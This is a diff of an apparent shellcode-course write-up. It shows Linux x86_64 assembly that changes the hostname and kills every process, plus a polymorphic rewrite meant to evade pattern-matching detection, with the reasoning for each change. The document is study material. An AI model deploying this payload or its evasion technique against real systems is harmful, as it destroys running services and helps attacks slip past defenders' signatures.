@@ -3,9 +3,159 @@
 ---
 ### Introduction
 ---
-One of the shellcodes to be used in this assignment and to obtain a polymorphic version of it is the [# Linux/x86_64 sethostname() & killall 33 bytes shellcode](http://shell-storm.org/shellcode/files/shellcode-605.php) by **zbt**.
+This assignment consists of taking three shellcode samples from shell-storm.org for Linux x86_64 and create polymorphic examples that are no larger than 150% the original size.
 
-The size of the shellcode is 33 bytes. This means that the polymorphic version of it can't be more than 49 bytes (150% of original size).
+The goal of this task is to mimic the same original functionality, but to beat pattern matching techniques that could be used to fingerprint the payload.
+
+Below are the three samples choosen with their original code and the polymorphic version with brief explanations on what has been done.
+
+### Sample 1: `sethostname() & killall 33 bytes shellcode`
+---
+> Shellcode Name: Linux/x86_64 sethostname() & killall 33 bytes shellcode
+> Author: zbt
+> Description: Changes the name of the host to "Rooted!" and then kills all processes running on the system
+> Original Shellcode Size: 33 bytes
+> Max Size of the polymorphic Version: 49 bytes
+> Size of the Created Polymorphic Version: **46 bytes (below the 150%)**
+The original code for the sample is:
+
+```asm
+    section .text
+        global _start
+ 
+    _start:
+ 
+        ;-- setHostName("Rooted !"); 22 bytes --;
+        mov     al, 0xaa
+        mov     r8, 'Rooted !'
+        push    r8
+        mov     rdi, rsp
+        mov     sil, 0x8
+        syscall
+ 
+        ;-- kill(-1, SIGKILL); 11 bytes --;
+        push    byte 0x3e
+        pop     rax
+        push    byte 0xff
+        pop     rdi
+        push    byte 0x9
+        pop     rsi
+        syscall
+```
+
+The Polymorphic version created is (comments of changes in the code):
+
+```asm
+global _start
+
+section .text
+
+_start:
+
+        jmp real_start
+        string: db "Rooted !"
+
+real_start:
+
+        ;-- setHostName("Rooted !"); 22 bytes --;
+        ;mov     al, 0xaa
+        ; RAX needs the 0xaa value.
+        ; 1.- First RAX will take value 70
+        ; 2.- Value 100 is added to rax
+        ; 3.- RDX is used to pur some garbage in the shellcode
+        push 70
+        pop rax
+        cdq                        ; Garbage (1 byte
+        push 100
+        pop rdx
+        add rax, rdx
+
+        ; Let's define a string and use Relative Addressing
+        ;mov     r8, 'Rooted !'
+        ;push    r8
+        ;mov     rdi, rsp
+        lea rdi, [rel string]
+
+        ;mov     sil, 0x8
+        push 0x08
+        pop rsi
+
+        syscall
+
+        ;-- kill(-1, SIGKILL); 11 bytes --;
+        push    byte 0x3e
+        pop     rax
+        
+        ; Let's push 0xc1 into RDI
+        ; Then add RAX to RDI
+        ; 0xff = 0x3e + 0xc1
+        ;push    byte 0xff
+        ;pop     rdi
+        push byte 0xc1
+        pop rdi
+        add rdi, rax                    ; RAX already has 0x3e value
+
+        ; RSI comes with a 0x08 value from previous code
+        ; Just need to Inc it to get the 0x09 value
+        ;push    byte 0x9
+        ;pop     rsi
+        inc rsi                         ; RSI has value 0x8 from previous
+                                        ;  syscall, then can increment 1
+                                        ;  to get the same value of 0x9
+        syscall
+```
+Changes made:
+1. A 8 bytes string is defined for storing the `"Rooted !"` instead of doing it in the stack. This **adds 10 bytes** to the shellcode and forces us to:
+  - Add a `jmp` to a real start label to bypass the string
+  - Use Relative Addressing later to reference to this string, and 
+```asm
+_start:
+        jmp real_start
+        string: db "Rooted !"
+real_start:
+```
+2. In the original code, RAX needs the value `0xaa`. To acomplish the same result the code is changed adding several instructions to get the same result. With this change, from 2 bytes of size for the original `mov`, size is increased to 10 bytes (2 extra bytes used):
+```asm
+
+                                   push 0x46
+                                   pop rax
+mov al, 0xaa       ==>>            cdq
+                                   push 0x64
+                                   pop rdx
+                                   add rax, rdx       ; Here RAX is 0xaa
+```
+3. In the original code, the '"Rooted !" string is saved in the stack, and RDI gets the address in the stack for this string. As the string has been defined as a variable, now can be accessed using relative addressing. The original code was 15 bytes, and with the change now is 7 bytes (saved 8 bytes here).
+```asm
+movabs r8,"Rooted !"
+push r8                    ==>      lea rdi, [rel string]
+mov rdi, rsp
+```
+4. Replace `mov` by `push;pop` instructions. Here RSI needs the value `0x08`. In the new code, the value is pushed in the stack and then poped in RSI:
+```asm
+mov sil, 0x08              ==>        push 0x08
+                                      pop rsi
+```
+5. Replace the `push;pop` instructions to put `0xff` value in RDI. As RAX has value at this point of `0x3e` we add the value `0xc1` to RDI and add an instruction to sum both values into RDI:
+```asm
+push 0x3e                push 0x3e
+pop rax                  pop rax
+push 0xff    ==>         push 0xc1
+pop rdi                  pop rdi
+                         add rdi, rax
+```
+6. As RSI already has value `0x08` from before, and now requires `0x09` value, just need to increment it. Then the `mov` is replaced by a ìnc`
+```asm
+push 0x09
+pop rsi        ==>       inc rsi
+```
+
+
+
+
+
+
+
+
 
 ### GitHub Repo Files
 ---
